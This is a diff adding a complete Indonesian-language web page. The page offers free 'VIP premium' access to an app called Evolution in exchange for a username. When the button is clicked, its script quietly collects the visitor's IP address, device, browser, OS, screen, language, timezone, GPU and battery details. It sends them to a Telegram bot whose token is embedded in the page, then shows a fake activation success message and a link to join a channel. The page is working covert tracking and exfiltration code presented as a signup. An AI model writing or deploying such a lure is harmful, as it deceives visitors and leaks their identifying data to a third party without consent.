@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Evolution Apk Version</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: radial-gradient(circle at top, #00111a, #000000);
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+      overflow: hidden;
+    }
+
+    .card {
+      background: rgba(15, 15, 30, 0.95);
+      border: 2px solid #00f0ff;
+      border-radius: 18px;
+      padding: 30px;
+      width: 370px;
+      box-shadow: 0 0 25px #00f0ff, 0 0 80px #004d66 inset;
+      text-align: center;
+      animation: float 3s ease-in-out infinite;
+      position: relative;
+      z-index: 2;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 15px;
+      color: #00f0ff;
+      text-shadow: 0 0 20px #00f0ff;
+    }
+
+    p {
+      font-size: 0.95rem;
+      line-height: 1.5;
+      margin-bottom: 25px;
+      color: #b8e9ff;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+      border: 2px solid #00f0ff;
+      background: #0a0a0f;
+      color: #fff;
+      font-size: 1rem;
+      text-align: center;
+      box-shadow: 0 0 12px #00f0ff inset;
+    }
+
+    button {
+      background: #00f0ff;
+      color: #0a0a0f;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      font-weight: bold;
+      text-transform: uppercase;
+      box-shadow: 0 0 20px #00f0ff, 0 0 60px #00f0ff;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #0a0a0f;
+      color: #00f0ff;
+      box-shadow: 0 0 25px #00f0ff, 0 0 80px #00f0ff;
+    }
+
+    /* Floating Card */
+    .floating-card {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      background: rgba(10, 20, 30, 0.98);
+      border: 2px solid #00f0ff;
+      border-radius: 14px;
+      padding: 25px;
+      text-align: center;
+      color: #00f0ff;
+      font-size: 1.2rem;
+      box-shadow: 0 0 30px #00f0ff;
+      z-index: 9999;
+      transition: transform 0.3s ease-in-out;
+    }
+
+    .floating-card.show {
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    .join-btn {
+      margin-top: 15px;
+      display: inline-block;
+      background: #00f0ff;
+      color: #0a0a0f;
+      padding: 10px 20px;
+      border-radius: 6px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 0 20px #00f0ff;
+      transition: 0.3s;
+    }
+
+    .join-btn:hover {
+      background: #0a0a0f;
+      color: #00f0ff;
+      box-shadow: 0 0 25px #00f0ff, 0 0 60px #00f0ff;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Evolution Apk Version</h1>
+    <p>
+      Dapatkan Akses Premium VIP 7 Hari untuk mencoba aplikasi Evolution.<br>
+      Silahkan Masukan Username Anda.
+    </p>
+
+    <input type="text" id="username" placeholder="Masukkan Username">
+
+    <button onclick="sendPermintaan()">Create Account</button>
+  </div>
+
+  <!-- Floating Card -->
+  <div id="floatingCard" class="floating-card">
+    ✅ Terimakasih,<br> Permintaan Aktivasi Sukses<br>
+    Silahkan Follow Channel Kami
+    <br>
+    <a href="https://t.me/TheEvolutionCh" target="_blank" class="join-btn">Join Channel</a>
+  </div>
+
+  <script>
+    async function sendPermintaan() {
+      const username = document.getElementById("username").value.trim();
+      if (!username) {
+        alert("⚠️ Username wajib diisi!");
+        return;
+      }
+
+      try {
+        // ambil IP
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+
+        // ambil info device
+        const device = navigator.userAgent;
+        const battery = await navigator.getBattery();
+        const batPercent = Math.floor(battery.level * 100);
+        const charging = battery.charging ? "Ya" : "Tidak";
+        const browser = navigator.appName + " " + navigator.appVersion;
+        const os = navigator.platform;
+        const screenRes = window.screen.width + "x" + window.screen.height;
+        const lang = navigator.language;
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        // coba ambil info GPU
+        let gpu = "Tidak Terdeteksi";
+        try {
+          const canvas = document.createElement("canvas");
+          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+          if (gl) {
+            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+            if (debugInfo) {
+              gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+          }
+        } catch (e) {}
+
+        const message = `
+\`\`\`Evolution Location
+👤 Username : ${username}
+📱 Device   : ${device}
+🌐 Browser  : ${browser}
+💻 OS       : ${os}
+🖥️ Resolusi : ${screenRes}
+🌍 Bahasa   : ${lang}
+⏰ Timezone : ${tz}
+🎮 GPU      : ${gpu}
+🔋 Baterai  : ${batPercent}%
+⚡ Charging : ${charging}
+🌐 IP       : ${ipData.ip}
+\`\`\``;
+
+        // Kirim langsung ke group
+        await fetch(`https://api.telegram.org/bot8481945039:AAG_mMjyPB5nzNniX-J4XBQw9u9y20DsUk0/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: -1002974354168,
+            text: message
+          })
+        });
+
+        // Tampilkan floating card
+        const floatingCard = document.getElementById("floatingCard");
+        floatingCard.classList.add("show");
+
+        setTimeout(() => {
+          floatingCard.classList.remove("show");
+        }, 5000);
+
+      } catch (err) {
+        console.error(err);
+        alert("❌ Gagal mengirim permintaan.");
+      }
+    }
+  </script>
+</body>
+</html>
